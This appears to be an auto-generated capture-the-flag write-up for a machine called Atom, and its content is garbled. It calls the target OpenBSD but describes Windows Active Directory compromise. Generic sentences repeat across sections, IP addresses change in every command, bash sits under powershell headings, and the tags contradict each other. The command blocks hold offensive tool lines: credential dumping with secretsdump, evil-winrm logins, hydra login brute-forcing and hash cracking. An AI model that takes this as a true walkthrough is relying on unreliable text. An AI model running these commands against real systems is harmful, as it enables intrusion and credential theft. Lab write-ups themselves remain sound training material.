---
TitleSEO: "OffSec Proving Grounds — Atom (Hard OpenBSD) | ZureFX"
TitlePost: "OffSec Proving Grounds — Atom (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds Atom. SSRF and Sudo Misconfiguration to achieve hard compromise on OpenBSD."
Keywords: "insane, tryhackme, web, easy, forensics, hard, pwntilldawn"
URL: "https://zurefx.github.io/writeups/htb-atom-459.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-atom-459/"
Date: "2024-09-29"
Tags: "Insane, TryHackMe, Web, Easy, Forensics, Hard, PwnTillDawn"
Section: "writeups"
Lang: "en"
main_img: "htb-atom-459"
Permalink: "/writeups/htb-atom-459.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Atom** is rated **Hard** on OffSec Proving Grounds. It runs **OpenBSD** and the IP address during this analysis was `10.60.229.91`.

### Objectives

Command injection was possible through unsanitized user input in the search functionality. The service account had excessive permissions assigned in Active Directory.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.88.56.25
evil-winrm -i 10.18.96.178 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.66.144.31/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Post-exploitation enumeration revealed a path to domain administrator privileges. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.98.57.200/FUZZ
```

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target.

### Web Enumeration

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.63.46.85 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.16.27.243/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.126.106.158/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
gobuster dir -u http://10.77.4.252/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Token impersonation allowed elevation to SYSTEM privileges on the target. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

Key finding: **SSRF**.

The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.21.104.177
impacket-secretsdump administrator:'P@ssw0rd!'@10.49.177.141
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Group Policy Preferences contained encrypted but recoverable credentials. Command injection was possible through unsanitized user input in the search functionality. The scheduled task ran with elevated privileges and could be abused for escalation.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.18.237
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.14.54.93 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.59.221.104 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The service account had excessive permissions assigned in Active Directory.

```powershell
evil-winrm -i 10.109.195.238 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.21.189.123 -u administrator -p 'P@ssw0rd!'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.119.11.191/FUZZ
feroxbuster -h
```

Privilege escalation was possible due to misconfigured sudo permissions. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Initial enumeration revealed several interesting open ports on the target. Privilege escalation was possible due to misconfigured sudo permissions.

## Summary

### Tools Used

- `mimikatz`
- `nikto`
- `pwncat`
- `secretsdump`

### Key Takeaways

- SSRF
- Sudo Misconfiguration
- Unquoted Service Path
- SUID Binary
